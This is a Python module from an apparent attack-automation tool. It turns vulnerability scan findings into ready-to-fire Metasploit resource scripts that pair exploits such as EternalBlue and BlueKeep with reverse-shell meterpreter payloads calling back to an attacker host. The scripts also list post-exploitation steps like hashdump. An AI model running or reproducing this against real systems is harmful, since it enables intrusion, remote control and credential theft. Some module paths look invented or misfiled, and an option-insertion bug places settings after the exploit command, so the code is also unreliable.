"""weaponizer.py — Phase 2: Payload weaponization.

Reads scan findings (vuln type → target IP/port), detects OS from
service banner, and produces a complete Metasploit resource script
that the operator can review and fire from the web terminal.

Everything is pre-filled, nothing auto-executes.
"""
from __future__ import annotations

import re
from typing import Any, Dict, List, Optional


# ── OS detection from service fingerprints ─────────────────────────
_WINDOWS_SIGS = ("microsoft iis", "windows", "smb", "ms-ds", "rdp", "ms-rdp")
_LINUX_SIGS = ("linux", "apache", "nginx", "openssh", "proxmox", "ubuntu", "debian")


def detect_os(banner: str) -> str:
    """Guess OS from service banner / tech string."""
    low = (banner or "").lower()
    for sig in _WINDOWS_SIGS:
        if sig in low:
            return "windows"
    for sig in _LINUX_SIGS:
        if sig in low:
            return "linux"
    return "unknown"


# ── Payload selection ─────────────────────────────────────────────
def pick_payload(os_type: str, service: str) -> str:
    """Return the best Metasploit payload for an OS/service combo."""
    svc = (service or "").lower()
    if os_type == "windows":
        if svc in ("smb", "microsoft-ds", "445"):
            return "windows/x64/meterpreter/reverse_tcp"
        if svc in ("rdp", "3389"):
            return "windows/x64/meterpreter/reverse_tcp"
        return "windows/x64/meterpreter/reverse_tcp"
    # linux
    if svc in ("ssh", "22"):
        return "linux/x64/meterpreter/reverse_tcp"
    return "linux/x64/shell_reverse_tcp"


# ── Exploit selection ─────────────────────────────────────────────
def pick_exploit(vuln_name: str, service: str, os_type: str) -> Optional[str]:
    """Map a vuln name / service to a concrete Metasploit module."""
    v = (vuln_name or "").lower()
    svc = (service or "").lower()

    # Credential / auth bypass
    if "ftp" in svc and ("anonymous" in v or "auth" in v or "login" in v):
        return "exploit/unix/ftp/vsftpd_234_backdoor"
    if "ssh" in svc and ("auth" in v or "brute" in v or "login" in v or "password" in v):
        return "exploit/unix/ssh/libssh_auth_bypass"
    if "rmi" in v or "jmx" in v:
        return "exploit/multi/misc/java_rmi_server"
    if "tomcat" in v or "manager" in v:
        return "exploit/multi/http/tomcat_mgr_upload"
    if "weblogic" in v:
        return "exploit/multi/http/weblogic_deserialize_rce"
    if "struts" in v or "cve-2017-5638" in v:
        return "exploit/multi/http/struts2_content_type_ognl"
    if "phpmyadmin" in v:
        return "exploit/unix/http/phpmyadmin_lfi"
    if "iis" in svc or "shortname" in v:
        return "exploit/windows/iis/iis_webdav_scstoragepathfromurl"
    if "smb" in svc or "ms17-010" in v or "eternalblue" in v:
        return "exploit/windows/smb/ms17_010_eternalblue"
    if "rdp" in svc or "cve-2019-0708" in v or "bluekeep" in v:
        return "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
    if "mysql" in svc:
        return "exploit/mysql/mysql_udf_payload"
    if "postgres" in svc:
        return "exploit/linux/postgres/postgres_payload"
    if "vnc" in svc:
        return "exploit/unix/vnc/realvnc_bypass"
    if "smtp" in svc:
        return "exploit/scanner/smtp/smtp_enum"
    if "dns" in svc:
        return "exploit/unix/dns/bind_remote_code_execution"
    if "redis" in svc:
        return "exploit/multi/redis/redis_destructive_command"
    if "mongo" in svc:
        return "exploit/multi/mongodb/mongodb_js_injection"
    return None


# ── Resource script builder ───────────────────────────────────────
def build_resource_script(
    exploit: str,
    payload: str,
    rhost: str,
    rport: int,
    lhost: str,
    lport: int,
    extra_options: Optional[Dict[str, str]] = None,
) -> str:
    """Build a complete msfconsole resource script (RC file).

    The script is pre-filled and ready to paste into the web terminal.
    It does NOT auto-execute.
    """
    lines = [
        "# Auto-generated by Attack Surface — Kill Chain Weaponizer",
        f"# Target: {rhost}:{rport}",
        f"# Exploit: {exploit}",
        f"# Payload: {payload}",
        "",
        f"use {exploit}",
        f"set RHOSTS {rhost}",
        f"set RPORT {rport}",
        f"set PAYLOAD {payload}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set ExitOnSession false",
        "set DisablePayloadHandler false",
        "exploit -j -z",
        "",
        "# After session opens, run in meterpreter:",
        "#   sysinfo",
        "#   getuid",
        "#   hashdump",
        "#   screenshot",
    ]
    if extra_options:
        for k, v in extra_options.items():
            lines.insert(-4, f"set {k} {v}")
    return "\n".join(lines)


# ── Weaponize one finding ─────────────────────────────────────────
def weaponize(
    finding: Dict[str, Any],
    lhost: str = "127.0.0.1",
    lport: int = 4444,
) -> Dict[str, Any]:
    """Produce a complete weaponization plan for one scan finding.

    Returns dict with:
      - os_type
      - payload
      - exploit
      - resource_script
      - commands (list of individual commands for terminal pre-fill)
      - warning (if no exploit found)
    """
    service = finding.get("service", finding.get("name", ""))
    banner = finding.get("banner", finding.get("tech", ""))
    vuln = finding.get("vuln", finding.get("title", finding.get("detail", "")))
    rhost = finding.get("host", finding.get("target", ""))
    rport = finding.get("port", 80)
    try:
        rport = int(rport)
    except (ValueError, TypeError):
        rport = 80

    os_type = detect_os(f"{banner} {service}")
    payload = pick_payload(os_type, service)
    exploit = pick_exploit(vuln, service, os_type)

    if not exploit:
        return {
            "os_type": os_type,
            "payload": payload,
            "exploit": None,
            "resource_script": "",
            "commands": [],
            "warning": (
                f"No exploit module mapped for vuln={vuln!r} "
                f"service={service!r} — review manually in msfconsole"
            ),
        }

    rc = build_resource_script(exploit, payload, rhost, rport, lhost, lport)
    cmds = [
        f"msfconsole -q -r /tmp/weapon_{rhost}.rc",
    ]
    return {
        "os_type": os_type,
        "payload": payload,
        "exploit": exploit,
        "resource_script": rc,
        "commands": cmds,
        "warning": None,
    }
